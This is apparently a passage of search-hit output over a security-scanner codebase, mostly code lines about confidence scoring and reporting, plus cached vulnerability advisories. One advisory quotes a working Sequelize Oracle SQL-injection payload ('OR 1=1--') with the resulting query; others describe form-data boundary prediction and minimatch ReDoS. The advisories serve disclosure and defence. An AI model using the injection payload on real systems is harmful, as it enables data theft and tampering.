fit in a query string or JSON body without triggering the 64 KB length guard.\n\n`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).\n\n**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.",
+[timestamp] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:9749 | "details": "### Summary\nSQL Injection is possible with strings only **if dialect is set to `oracle`**.\nThe vulnerability was confirmed on Sequelize v6.37.3.\n\n### Details\nThe `escape` function defined in `sql-string.js` does not escape quotes if the value starts with `TO_TIMESTAMP` or `TO_DATE`.\n\n```javascript\n  } else if (dialect === 'oracle' && typeof val === 'string') {\n    if (val.startsWith('TO_TIMESTAMP') || val.startsWith('TO_DATE')) {\n      return val;\n    }\n    val = val.replace(/'/g, \"''\");\n  }\n```\n\n### PoC\nSuppose the application has the following code:\n\n```javascript\n  var result = await models.Student.findOne({\n    where: {\n      firstName: req.query.firstName\n    }\n  });\n```\n\nAn attacker can inject arbitrary sql expressions.\n\n`http://host/path?firstName=TO_DATE('0','Y')||'' OR 1=1--`\n\nThe resulted SQL will be:\n\n```SQL\nSELECT ... WHERE \"Student\".\"firstName\" = TO_DATE('0','Y')||'' OR 1=1-- ORDER BY \"Student\".\"id\" OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;\n```\n\n### Impact\nData theft and tampering.",
+[timestamp] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:687 | "Record reviewer identity, decision, timestamp, and reason for approval or rejection.",
+[timestamp] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:756 | "Track data lineage, uploader identity, license, timestamp, and approval status for every dataset.",
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:1527 | "reachability_confidence": pkg.get("reachability_confidence"),
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:1963 | finding["evidence_confidence"] = "HIGH"
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:1964 | finding["context_confidence"] = "MEDIUM"
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:2836 | "reachability_confidence": pkg.get("reachability_confidence"),
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:2837 | "reachability_confidence_label": pkg.get("reachability_confidence_label"),
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:3640 | payload["metadata"]["release_readiness_confidence"] = rrs.get(
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:3641 | "release_confidence",
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:3660 | payload["metadata"]["executive_decision_confidence"] = ed.get(
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:3661 | "decision_confidence", 0
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:3779 | f"{dfcs.get('correlation_confidence', 'NOT_AVAILABLE')} | "
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:3947 | f"confidence {rrs.get('release_confidence', 0)}"
+[confidence] D:\data\Code test\r-SecOpsX_V11\main.py:3955 | f"confidence {ed.get('decision_confidence', 0)}"
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_engine.py:247 | "confidence": "Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_engine.py:403 | finding["confidence"] = "Low"
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\api_abuse_risk_engine.py:65 | "confidence": "Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_correlation_engine.py:25 | confidence: str,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_correlation_engine.py:36 | "confidence": confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:136 | confidence: str,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\auth_hardening_risk_engine.py:145 | "confidence": confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_llm_precision_controlled.py:170 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_llm_precision_controlled.py:171 | "confidence_label": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_llm_precision_controlled.py:172 | "confidence_score": 90,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:31 | confidence: str,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:43 | "confidence": confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:234 | corr["confidence"] = "Low"
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:246 | # Executive relevance requires confirmed workflow evidence and high-confidence
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:251 | and str(corr.get("confidence", "")).title() == "High"
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\business_logic_correlation_engine.py:269 | str(c.get("confidence", "")).title() == "High"
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\copyright_ip_compliance_engine.py:221 | "confidence": "Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\crypto_misuse_engine.py:120 | "confidence": "Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:96 | return {"rule_id":f"CORR_{kind.upper()}","title":title,"vuln_type":kind,"severity":sev,"priority":_priority(sev),"confidence":"High" if len(findings)>1 else "Medium","language":base.get("language","unknown"),"file":_norm_file(base),"line":base.get("line",0),"snippet":base.get("snippet",""),"description":evidence_note,"remediation":["Enforce object-level authorization before repository/database access.","Validate tenant ownership in every data access path.","Use centralized authorization guards and regression tests.","Make workflow state transitions atomic and server-side enforced."],"owasp":"A01:2021 - Broken Access Control","cwe":"CWE-639","evidence":" | ".join(f"{_norm_file(f)}:{f.get('line')}:{f.get('title')}" for f in findings[:4]),"detection":"Data Flow Correlation","engine":"analysis.data_flow_correlation_engine","correlation_type":kind,"correlated_findings":findings,"group_key":f"CORR_{kind.upper()}|{_norm_file(base)}|{base.get('line',0)}","enterprise_control":True,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:218 | result.setdefault("correlation_confidence", "MIXED_OR_CONTEXTUAL")
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:254 | "confidence": finding.get("confidence", "Medium"),
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\data_flow_correlation_engine.py:291 | "correlation_confidence": "MIXED_OR_CONTEXTUAL",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\ddapi_abuse_engine.py:200 | "confidence": "Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\dependency_graph_v2.py:39 | confidence: str = VERIFIED
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\dependency_graph_v2.py:268 | confidence=VERIFIED,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\dependency_graph_v2.py:327 | confidence = _clean(edge.get("confidence"))
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\dependency_graph_v2.py:335 | if confidence != VERIFIED:
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\dependency_graph_v2.py:414 | assert edge["confidence"] == VERIFIED
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:7 | "base_confidence": 0.70,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:11 | "base_confidence": 0.78,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:15 | "base_confidence": 0.86,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:19 | "base_confidence": 0.90,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:23 | "base_confidence": 0.95,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:61 | def _max_confidence(governance_result: dict) -> float:
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:63 | float(s.get("confidence") or 0.0)
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:71 | confidence: float,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:83 | "decision_confidence": round(
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:84 | max(confidence, meta.get("base_confidence", 0.75)), 2
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:109 | "decision_confidence": 0.95,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:132 | confidence = min(float(release_readiness.get("release_confidence") or 0.8), 0.90)
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:140 | confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:154 | max_conf = _max_confidence(governance_result)
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\executive_decision_engine.py:241 | "confidence": 0.95,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\framework_enrichment_engine.py:37 | return {"rule_id": rid, "title": title, "vuln_type": rid.lower(), "severity": sev, "priority": _priority(sev), "confidence":"Medium", "language":"framework", "file":str(file), "line":line, "snippet":snippet.strip(), "description":f"Framework-aware configuration or coding pattern detected for {fw}.", "remediation":["Apply secure framework defaults.", "Require authentication/authorization on sensitive routes.", "Add validation, rate limits and regression tests."], "owasp":owasp, "cwe":cwe, "evidence":f"{file}:{line}: {snippet.strip()}", "detection":"Framework-Aware Static Enrichment", "engine":"analysis.framework_enrichment_engine", **controls, "framework":fw, "enterprise_control":True, "group_key":f"{rid}|{file}|{line}"}
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\governance_signal_engine.py:40 | def _confidence_from_count(count: int) -> float:
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\governance_signal_engine.py:61 | "confidence": _confidence_from_count(evidence_count),
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:229 | confidence: str,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:243 | "confidence": confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:347 | confidence="High",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:368 | confidence="Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:390 | confidence="Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:415 | confidence="High",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:436 | confidence="Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:480 | confidence="Low",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\identity_access_correlation_engine.py:508 | confidence="Low",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\ioc_malware_intelligence_engine.py:167 | "confidence": "LOW",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\ioc_malware_intelligence_engine.py:188 | "confidence": "LOW",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\ioc_malware_intelligence_engine.py:209 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\ioc_malware_intelligence_engine.py:226 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:223 | confidence_counts = Counter()
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:231 | confidence = flatten_text(first_value(f, "confidence")).upper()
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:267 | confidence_counts[confidence or "UNKNOWN"] += 1
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:282 | "confidence": confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:295 | "index", "finding_id", "title", "rule", "severity", "confidence",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:311 | "confidence_counts": dict(confidence_counts),
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:347 | md.append("## Confidence")
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:348 | for k, v in confidence_counts.most_common():
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_sast_fp_audit.py:122 | confidence = Counter()
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_sast_fp_audit.py:139 | conf = text(get(finding, "confidence")).upper() or "UNKNOWN"
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_sast_fp_audit.py:172 | confidence[conf] += 1
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_sast_fp_audit.py:191 | "confidence": conf,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_sast_fp_audit.py:214 | "confidence": confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_sast_fp_audit.py:255 | lines.extend(["", "## Confidence"])
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_sast_fp_audit.py:257 | for key, value in confidence.most_common():
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\npm_lock_graph_v2.py:546 | "confidence":
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\npm_lock_graph_v2.py:628 | if edge.get("confidence") != VERIFIED:
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1073 | "confidence": "HIGH" if exposure_hits and pii_hits else ("MEDIUM" if pii_hits else "LOW"),
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\privacy_data_exposure_engine.py:1109 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:67 | def _confidence_for(decision: str, gates: List[Dict[str, Any]]) -> float:
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\release_readiness_engine.py:405 | "release_confidence": _confidence_for(final_decision, gates),
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\sbom_inventory_engine.py:139 | "reachability_confidence": _clean(_first(pkg, "reachability_confidence", default=""), ""),
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:54 | confidence: str
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:316 | confidence="Low",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:343 | "confidence": "Low",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:363 | confidence="Low",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:375 | "confidence": result.confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py:470 | "confidence": "Low",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:222 | "confidence": "Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:249 | "confidence": "Low",
+[confidence] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:124 | return "Low-confidence supply chain naming or hygiene indicator observed."
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:12 | confidence swap, SBOM scoring, pivot point analysis.
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:38 | CONFIDENCE_RANK = {"High": 3, "Medium": 2, "Low": 1, "": 0}
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:56 | "confidence": f.get("confidence", ""),
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:234 | incoming_rank = CONFIDENCE_RANK.get(f.get("confidence", ""), 0)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:235 | existing_rank = CONFIDENCE_RANK.get(existing.get("confidence", ""), 0)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:248 | # representative changes because of confidence ranking.
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:575 | # static critical confidence optics using a central mapping catalog.
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:590 | if _rk in CONFIG_CRITICAL_RULES and str(f.get("confidence", "")).upper() == "LOW":
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:591 | f["confidence"] = "Medium"
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:628 | # confidence for secret presence, even when live validation is disabled.
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:631 | f["evidence_confidence"] = "HIGH"
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:632 | f["context_confidence"] = "MEDIUM"
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:636 | f["evidence_confidence"] = "HIGH"
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:637 | f["context_confidence"] = "MEDIUM"
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:644 | f.setdefault("evidence_confidence", "HIGH")
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\attack_graph.py:263 | # source-to-sink attack path. Exploitability/confidence are NOT substitutes
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\deduplicator.py:114 | "confidence": None,
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\deduplicator.py:143 | "confidence",
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:52 | f['confidence'] = 'LOW'
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:53 | try: f['confidence_score'] = min(float(f.get('confidence_score', 0) or 0), 25.0)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\finding_model.py:54 | except Exception: f['confidence_score'] = 0
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:12 | confidence swap, SBOM scoring, pivot point analysis.
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:27 | CONFIDENCE_RANK = {"High": 3, "Medium": 2, "Low": 1, "": 0}
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:162 | incoming_rank = CONFIDENCE_RANK.get(f.get("confidence", ""), 0)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:163 | existing_rank = CONFIDENCE_RANK.get(existing.get("confidence", ""), 0)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:264 | # GAP 7: confidence_score (0-100) for enterprise adoption
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:270 | _conf_base.get(f.get("confidence", ""), 40)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:276 | f["confidence_score"] = min(conf_score, 100)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:278 | f["confidence_label"] = (
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:285 | f["confidence"] = f["confidence_label"]  # unify the field name
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:300 | "taint_path", "confidence", "cve_note", "attack_scenario"]:
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:319 | -CONFIDENCE_RANK.get(f.get("confidence", ""), 0),
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:443 | low_conf = [f for f in findings if f.get("confidence") == "Low"]
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:446 | f"LOW CONFIDENCE: {len(low_conf)} finding"
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:12 | confidence swap, SBOM scoring, pivot point analysis.
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:27 | CONFIDENCE_RANK = {"High": 3, "Medium": 2, "Low": 1, "": 0}
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:179 | incoming_rank = CONFIDENCE_RANK.get(f.get("confidence", ""), 0)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:180 | existing_rank = CONFIDENCE_RANK.get(existing.get("confidence", ""), 0)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:291 | # GAP 7: confidence_score (0-100) for enterprise adoption
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:297 | _conf_base.get(f.get("confidence", ""), 40)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:303 | f["confidence_score"] = min(conf_score, 100)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:305 | f["confidence_label"] = (
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:312 | f["confidence"] = f["confidence_label"]  # unify the field name
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:327 | "taint_path", "confidence", "cve_note", "attack_scenario"]:
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:346 | -CONFIDENCE_RANK.get(f.get("confidence", ""), 0),
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:470 | low_conf = [f for f in findings if f.get("confidence") == "Low"]
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:473 | f"LOW CONFIDENCE: {len(low_conf)} finding"
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\risk_scorer.py:24 | "confidence":       "Taint analysis confidence (High=1.0Ã—, Medium=0.85Ã—, Low=0.70Ã—)",
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\risk_scorer.py:46 | CONFIDENCE_MULTIPLIER = {"High": 1.0, "Medium": 0.85, "Low": 0.70, "": 0.85}
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\risk_scorer.py:84 | confidence = str(result.get("confidence", "Medium") or "Medium").title()
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\risk_scorer.py:94 | cm        = CONFIDENCE_MULTIPLIER.get(confidence, 0.85)
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\risk_scorer.py:112 | "confidence_multiplier":  cm,
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\risk_scorer.py:117 | f"= {raw:.2f}/10 â†’ {raw_score} Ã— {cm} confidence = {score}"
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract.py:37 | "confidence",
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:176 | - does not promote confidence
+[confidence] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:212 | "confidence": f.get("confidence"),
+[confidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:142 | 'confidence',
+[confidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:69 | $_.Name -match 'evidence|schema|graph|attack|provenance|confidence|finding|risk|decision|rcmsp'
+[confidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:121 | 'confidence',
+[confidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:126 | 'EvidenceConfidence',
+[confidence] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:196 | $Text.Contains('confidence') -or
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\cyclonedx_export.py:315 | and str(edge.get("confidence") or "").upper() == "VERIFIED"
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:9 | 3. WARN â€” Findings sheet: "Confidence" and "Score Rationale" columns added,
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:10 | surfacing score_finding() breakdown and taint confidence per finding
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:58 | # Confidence cell colours
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:308 | def _evidence_confidence(item: dict) -> str:
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:509 | ("Confidence Multipliers", "High=1.0Ã—  Medium=0.85Ã—  Low=0.70Ã—"),
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:510 | ("Methodology Note", "Pattern-only Critical findings are severity-critical because the sink is dangerous; exploitability/confidence may remain Medium/Low until taint or runtime validation confirms reachability."),
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:566 | # FIX #3: added Confidence and Score Rationale columns
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:574 | "Confidence", "Evidence Confidence", "Data Classification", "Detection Source", "Engine Name",
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:596 | confidence = f.get("confidence", "")
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:631 | confidence,               # FIX #3
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:632 | _evidence_confidence(f),
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:653 | elif j == 20:  # Confidence â€” colour-coded cell
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:654 | cell.fill = CONF_FILL.get(confidence, _fill(bg))
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:655 | cell.font = CONF_FONT.get(confidence, _font(color=C_BLK))
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:1036 | ("Exploitable / High-confidence Risk", pct(exploitable), "Findings with taint validation, high exploitability, or directly exploitable behavior."),
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3029 | # Issue 5: single Detection value, used in both Exploitability and Confidence rows
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3095 | ["Confidence",   f.get("confidence_label","") or f.get("confidence",""),
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\sarif_export.py:100 | "precision": finding.get("confidence") or finding.get("confidence_label") or "medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\sarif_export.py:104 | "confidence": finding.get("confidence"),
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\sarif_export.py:131 | "risk_score": finding.get("risk_score"), "confidence": finding.get("confidence"),
+[confidence] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:81 | "reachability_status": _reachability_status(pkg), "reachability_confidence": pkg.get("reachability_confidence"),
+[confidence] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:4906 | "details": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\abom.py:326 | Explicit framework-specific constructs remain high-confidence. Generic
